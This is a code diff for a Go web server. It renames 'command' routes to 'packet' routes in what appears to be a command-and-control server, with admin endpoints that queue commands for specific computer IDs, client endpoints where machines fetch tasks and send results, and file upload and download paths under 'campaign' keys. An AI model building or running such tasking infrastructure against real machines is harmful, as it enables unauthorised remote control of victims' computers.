@@ -47,11 +47,11 @@ func (s *Server) Serve() {
 	// Admin Authenticated
 	adminRouter := myRouter.PathPrefix("/admin").Subrouter()
 	adminRouter.Use(GetAdminMiddleware(s.campgain.AdminApiKey))
-	adminRouter.HandleFunc("/commands", s.adminListCommands)
-	adminRouter.HandleFunc("/commands/{computerId}", s.adminListCommandsComputerId)
+	adminRouter.HandleFunc("/packets", s.adminListPackets)
+	adminRouter.HandleFunc("/packets/{computerId}", s.adminListPacketsComputerId)
 	adminRouter.HandleFunc("/clients", s.adminListClients)
-	adminRouter.HandleFunc("/addTestCommand", s.adminAddTestCommand)
-	adminRouter.HandleFunc("/addCommand", s.adminAddCommand)
+	adminRouter.HandleFunc("/addTestPacket", s.adminAddTestPacket)
+	adminRouter.HandleFunc("/addPacket", s.adminAddPacket)
 	adminRouter.HandleFunc("/campaign", s.getCampaign)
 	go s.adminWebSocket.Distributor()
 	adminRouter.PathPrefix("/upload").Handler(http.StripPrefix("/admin/upload/",
@@ -63,14 +63,14 @@ func (s *Server) Serve() {
 	// Client Authenticated
 	clientRouter := myRouter.PathPrefix("/").Subrouter()
 	clientRouter.Use(GetClientMiddleware(s.campgain.ApiKey))
-	clientRouter.HandleFunc(s.campgain.CommandGetPath+"{computerId}", s.getCommand) // /getCommand/{computerId}
-	clientRouter.HandleFunc(s.campgain.CommandSendPath, s.sendCommand)              // /sendCommand
+	clientRouter.HandleFunc(s.campgain.PacketGetPath+"{computerId}", s.getPacket) // /getPacket/{computerId}
+	clientRouter.HandleFunc(s.campgain.PacketSendPath, s.sendPacket)              // /sendPacket
 
 	// Authentication only via packetId parameter
-	myRouter.HandleFunc(s.campgain.CommandFileUploadPath+"{packetId}", s.uploadFile) // /upload/{packetId}
+	myRouter.HandleFunc(s.campgain.FileUploadPath+"{packetId}", s.uploadFile) // /upload/{packetId}
 	// Authentication based on known filenames
-	myRouter.PathPrefix(s.campgain.CommandFileDownloadPath).Handler(
-		http.StripPrefix(s.campgain.CommandFileDownloadPath, http.FileServer(http.Dir("./static/")))) // /static
+	myRouter.PathPrefix(s.campgain.FileDownloadPath).Handler(
+		http.StripPrefix(s.campgain.FileDownloadPath, http.FileServer(http.Dir("./static/")))) // /static
 
 	// Allow CORS
 	c := cors.New(cors.Options{
